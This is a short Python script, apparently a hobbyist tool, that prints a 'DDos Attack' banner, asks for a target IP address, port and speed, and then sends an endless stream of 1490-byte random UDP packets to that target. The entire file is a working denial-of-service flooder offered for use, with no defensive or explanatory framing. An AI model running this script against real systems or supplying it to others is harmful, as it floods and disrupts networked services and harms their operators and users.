# brew install figlet

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print (" ")
print (" ---------------------[Let's do it]--------------------- ")
print (" ")
ip = input("IP Target   : ")
port = int(input("Port        : "))
sd = int(input("Sd(1~1000)  : "))

os.system("clear")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("sent %s packet to %s throught port: %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)
